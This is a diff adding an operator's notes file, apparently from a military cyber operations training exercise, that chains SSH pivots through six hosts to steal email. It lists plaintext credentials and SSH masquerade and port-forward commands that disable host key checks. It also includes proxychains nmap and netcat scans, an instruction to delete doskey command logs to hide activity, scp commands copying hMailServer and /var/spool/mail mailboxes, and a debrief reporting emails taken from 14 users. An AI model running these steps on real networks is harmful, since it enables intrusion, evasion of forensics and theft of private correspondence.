@@ -1,0 +1,178 @@
+
+IPs:
+BELLIGERENTBADGER01
+2022-08-22
+>T1: 10.50.29.166
+->T2: 10.20.169.13
+-->T3: 10.20.169.239
+--->T4: 192.186.169.133
+---->T5: Suspected mail server?
+---->T6: Suspected mail server?
+
+Objective: identify path to ADMIN2 workstation. If successfully accessed, pivot from ADMIN2 to any discovered mail servers. Intelligence reporting suggests there are two operational mail servers.
+
+UPDATE to Guidance: Due to the presence of NAT'ing in observed networks, all IPs assigned to a target should be reported to the analyst if they are not documented on the MP, regardless of interfaces. Loopback does not require reporting.
+
+Credentials: engineer#::enshallah // caisson#::tread_depth // NOC_Admin#::AhmdLxu29D **administrators documented to frequently implement default creds on internal routers and various other devices to enable incident response outsourcing
+
+
+T1:
+Hostname: EXT_RTR
+IP: 10.50.29.166 @@@@@@@@@@@@@@@@@@@@@@2check new IP@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@22
+OS: Linux v. unknown
+Creds: engineer#::enshallah
+Last Known SSH Port: 10123
+
+ssh -MS /tmp/T1 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null engineer4@10.50.29.166 -p 10123
+enshallah
+
+Action: Perform SSH masquerade and redirect to the next target.
+
+
+T2
+Hostname: FILESVR
+IP: 10.20.169.13 @@@@@@@@@@@@@@@@@@@@@@2check new IP@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@22
+OS: Windows Server 2019@@@@@@@@@@@@@@@@@@@@@check OS@@@@@@@@@@@@@@@@@@@@@@@@@
+Creds: caisson#::tread_depth
+Last Known SSH Port: 52203
+Security Product(s): Unknown
+Malware: Unknown
+Implant: None
+
+ssh -S /tmp/T1 bad -O forward -L 2222:10.20.169.13:52203
+ssh -MS /tmp/T2 -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null caisson4@localhost
+tread_depth
+
+Action: Perform SSH masquerade and redirect to the next target.
+
+#@@@@@@@@@@@@@@@@@@@@@@@dont use DIR command@@@@@@@@@@@@@@@@@@@@@@@@@@2
+@@@@@@@@@@@@@@@@@@@@@@EFFECT delete the doskey files@@@@@@@@@@@@@@@@@@@@@@@@@@
+
+
+T3:
+Hostname: Vyos2
+IP: 10.20.169.239 @@@@@@@@@@@@@@@@@@@@@@2check new IP@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@22
+OS: Vyos@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@check OS@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+Creds: NOC_Admin#::AhmdLxu29D
+Last Known SSH Port: 52230
+ssh -S /tmp/T2 bad -O forward -L 3333:10.20.169.239:52230
+ssh -MS /tmp/T3 -p 3333 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null NOC_Admin4@localhost
+AhmdLxu29D
+Action: Perform SSH masquerade and redirect to the next target.
+
+
+T4:
+Hostname: ADMIN2
+IP: 192.186.169.41 @@@@@@@@@@@@@@@@@@@@@@2check new IP@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@22
+OS: CentOS 7 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@check OS@@@@@@@@@@@@@@@@@@@@@@@@22
+Creds: Unknown - Request analyst input
+Last Known SSH Port: Ask Analyst
+ T4 info: 33157 - askar#::DaXedayLasarah
+ssh -S /tmp/T3 bad -O forward -L 4444:192.186.169.41:33157
+ssh -MS /tmp/T4 -p 4444 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null askar4@localhost
+DaXedayLasarah
+
+Action: Test credentials supplied by analyst via SSH masquerade. If successful, perform @@device survey. Report any files of interest. Collect your current user’s ssh keys. Conduct network discovery to locate any mail servers and open ssh ports. Scan for suspected mail server IP’s, OS’s, and SSH Port(s). Redirect to any additional targets of interest.
+
+COLLECTION:
+1. Find ssh keys and CHECK FILESIZE
+2. md5sum .ssh/keys @@@@@send to anaylst@@@@
+3. scp or copy
+4. md5sum again @@@@@@send to analylst@@@@@
+
+for i in {1..50}; do sudo ping -c 1 -W 1 10.101.169.$i; done | grep 'bytes from'
+ssh -S /tmp/T4 bad -O forward -D 9050
+proxychains nmap -Pn -sT 10.101.169.1,2,3,5,30,35 -p33000-33999 -T4 --oG proxychains_nmap | grep open
+proxychains nmap -Pn -sT 10.101.169.30 -p33500-33999 -T4 --oG proxychains_nmap | grep open
+proxychains nc 10.101.169.30 33000-33600 | grep open
+proxychains nc 10.101.169.35 33501
+
+seq 33000 33600 | xargs -P 50 -I{} proxychains nc 10.101.169.30 {} | grep OK
+
+seq 30 30 | xargs -P 50 -I{} proxychains nmap -p33000-33999 -sT -Pn --open -n -T4 --min-parallelism 100 --min-rate 1 --oG proxychains_nmap --append-output 10.101.169.{} | grep open
+
+seq 33000 33999 | xargs -P 50 -I{} proxychains nmap -p{} -sT -Pn --open -n -T4 --min-parallelism 100 --min-rate 1 --oG proxychains_nmap --append-output 10.101.169.30 | grep open
+
+sudo netstat -auntp | grep askar23
+
+10.101.169.30:33501
+proxychains nc 10.101.169.30 33501
+proxychains nc 10.101.169.35 33501
+proxychains nc 10.101.169.1 33501
+proxychains nc 10.101.169.2 33501
+proxychains nc 10.101.169.4 33501
+
+
+VERIFY and ADD new IPS to MP TALK to MC $$$$%$%^$%^%^*&^*%^%
+
+######################################################CHECK NSDB##########################################################
+
+T5:  Suspected mail server
+Hostname: Unknown @@@@@@MC@@@@@@@
+IP: Unknown @@@@@@@@MC@@@@@@@@@@@@@@
+OS: Unknown @@@@@@@@@@@@@MC@@@@@@@@@@@@@2
+Creds: Unknown @@@@@@@@@EA@@@@@@@@@@@@@
+Last Known SSH Port: Unknown @@@@@@@@@@@@@@@EA@@@@@@@@@@@@@@
+
+ssh -S /tmp/T4 bad -O forward -L 5555:10.101.169.30:33501
+ssh -MS /tmp/T5 -p 5555 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null askar4@localhost
+DaXedayLasarah
+
+Action: Test credentials supplied by analyst via SSH masquerade. If successful, perform @@@@device survey. Catalog any accounts and collect all emails. Redirect to next target, if applicable.
+
+collect EMAILS, .eml
+
+Get-FileHash -Algorithm MD5 -Path (Get-ChildItem "C:\Program Files (x86)\hMailServer\Data\Workgroup\*.*" -Recurse)
+
+scp -o ControlPath=/tmp/T5 -P 5555 -r 'askar4@localhost:"C:/Program Files (x86)/hMailServer/Data/Workgroup/"' ~/Downloads/an_22-08-22_BELLIGERENTBADGER01/T5 
+
+COLLECTION:
+1. Find ssh keys and CHECK FILESIZE
+2. md5sum .ssh/keys @@@@@send to anaylst@@@@
+3. scp or copy
+4. md5sum again
+
+#######################DISCONNECT T5!!!!!!!!!!!!!!!@@@@@@@@@@@@@@@@@@@@@@@@@2222
+#########################DISCONNECT commands
+
+T6:  Suspected mail server
+Hostname: Unknown @@@@@@MC@@@@@@@
+IP: Unknown @@@@@@@@MC@@@@@@@@@@@@@@
+OS: Unknown @@@@@@@@@@@@@MC@@@@@@@@@@@@@2
+Creds: Unknown @@@@@@@@@EA@@@@@@@@@@@@@
+Last Known SSH Port: Unknown @@@@@@@@@@@@@@@EA@@@@@@@@@@@@@@
+Malware: Unknown
+Implant: None
+
+
+ssh -S /tmp/T4 bad -O forward -L 6666:10.101.169.35:33501
+ssh -MS /tmp/T6 -p 6666 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null askar4@localhost
+DaXedayLasarah
+
+Action: Test credentials supplied by analyst via SSH masquerade. If successful, perform @@device survey. Catalog any accounts and collect all emails. Conclude operation.
+
+collect EMAILS, .eml
+
+scp -o ControlPath=/tmp/T6 -P 6666 -r askar4@localhost:/var/spool/mail/* .
+
+COLLECTION:
+1. Find ssh keys and CHECK FILESIZE
+2. md5sum .ssh/keys @@@@@send to anaylst@@@@
+3. scp or copy
+4. md5sum again
+
+
+#########################DISCONNECT commands
+
+
+DEBRIEF 
+
+Operator: 1LT An
+
+Operation: BELLIGERENTBADGER01
+
+MC: mc1
+
+Analyst: analyst2
+
+Description: BELLIGERENTBADGER01 is a C-ISR mission profile. The main objective of this mission was to collect emails from suspected targets, T5 and T6. On T1, we redirected to T2. On T2, we found a doskey which logged our commands. The log was deleted as we tore down the paths. On T3, we redirected to T4. On T4, w conducted a survey and we scanned the network to find T5 and T6. After confirming with EA and MC, we maneuvered to T5 via ssh masquerade. On T5, we conducted a survey and collected emails from 7 users. After exiting T5, we got on to T6. We also conducted a survey and collected emails from 7 users. Overall, this mission was successful without any siginificant issues. Emails will be utilized to plan future operations. 
